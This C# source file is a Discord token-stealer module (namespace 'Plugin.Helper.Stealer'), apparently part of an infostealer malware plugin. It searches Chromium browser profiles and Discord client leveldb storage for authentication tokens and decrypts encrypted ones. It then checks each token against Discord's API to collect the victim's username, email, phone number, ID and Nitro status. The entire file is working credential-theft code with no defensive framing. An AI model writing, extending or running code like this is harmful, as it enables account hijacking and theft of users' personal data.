

using InvokedCommon.Structs;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;


namespace Plugin.Helper.Stealer
{
	public class Discord
	{
		private static Regex BasicRegex = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", RegexOptions.Compiled);
		private static Regex NewRegex = new Regex("mfa\\.[\\w-]{84}", RegexOptions.Compiled);
		private static Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

		public static DiscordUserData[] GetInfo()
		{
			HashSet<string> stringSet = new HashSet<string>();
			foreach (string str in Configuration.ChromiumBrowsers.Values)
			{
				if (Directory.Exists(str))
				{
					foreach (string profile in Chromium.GetProfiles(str))
					{
						string path = Path.Combine(str, profile, "Local Storage", "leveldb");
						if (Directory.Exists(path))
						{
							foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories))
							{
								string input1 = Utils.ForceReadFileString(file);
								if (input1 != null)
								{
									string input2 = Discord.RemoveNonPrintableCharacters(input1);
									for (Match match = Discord.BasicRegex.Match(input2); match.Success; match = match.NextMatch())
										stringSet.Add(match.Value);
									for (Match match = Discord.NewRegex.Match(input2); match.Success; match = match.NextMatch())
										stringSet.Add(match.Value);
								}
							}
						}
					}
				}
			}
			foreach (string discordPath in Configuration.DiscordPaths)
			{
				ChromeDecryptor chromeDecryptor = new ChromeDecryptor(discordPath);
				string path = Path.Combine(discordPath, "Local Storage", "leveldb");
				if (Directory.Exists(path))
				{
					foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories))
					{
						string input3 = Utils.ForceReadFileString(file);
						if (input3 != null)
						{
							string input4 = Discord.RemoveNonPrintableCharacters(input3);
							Match match1;
							for (match1 = Discord.BasicRegex.Match(input4); match1.Success; match1 = match1.NextMatch())
								stringSet.Add(match1.Value);
							for (Match match2 = Discord.NewRegex.Match(input4); match2.Success; match2 = match2.NextMatch())
								stringSet.Add(match1.Value);
							if (chromeDecryptor.operational)
							{
								for (Match match3 = Discord.EncryptedRegex.Match(input4); match3.Success; match3 = match3.NextMatch())
								{
									string str = chromeDecryptor.DecryptBase64(match3.Value.Substring("dQw4w9WgXcQ:".Length));
									if (str != null)
										stringSet.Add(str);
								}
							}
						}
					}
				}
			}
			List<DiscordUserData> discordUserDataList = new List<DiscordUserData>();
			using (WebClient client = new WebClient())
			{
				foreach (string token in stringSet)
				{
					DiscordUserData userData;
					if (Discord.GetTokenUserData(token, out userData, client))
						discordUserDataList.Add(userData);
				}
			}
			return discordUserDataList.ToArray();
		}

        private static bool GetTokenUserData(
            string token,
            out DiscordUserData userData,
            WebClient client = null)
        {
            userData = new DiscordUserData();
            bool clientCreated = false;
            if (client == null)
            {
                client = new WebClient();
                clientCreated = true;
            }

            try
            {
                client.Headers.Add("authorization", token);
                string json = client.DownloadString("https://discord.com/api/v9/users/@me");

                var serializer = new JavaScriptSerializer();
                var response = serializer.Deserialize<Dictionary<string, object>>(json);

                string username = response.TryGetValue("username", out object u) ? u?.ToString() : null;
                string email = response.TryGetValue("email", out object e) ? e?.ToString() : null;
                string phone = response.TryGetValue("phone", out object p) ? p?.ToString() : null;
                string id = response.TryGetValue("id", out object i) ? i?.ToString() : null;

                bool hasNitro = false;
                if (response.TryGetValue("flags", out object f) && f != null)
                    hasNitro = Convert.ToInt32(f) > 0;

                userData = new DiscordUserData(token, username, email, phone, id, hasNitro);
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                client.Headers.Remove("authorization");
                if (clientCreated)
                    client.Dispose();
            }
        }

        private static string RemoveNonPrintableCharacters(string input)
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (char c in input)
			{
				if (Discord.IsPrintable(c))
					stringBuilder.Append(c);
			}
			return stringBuilder.ToString();
		}

		private static bool IsPrintable(char c) => c >= ' ' && c <= '~';
	}
}
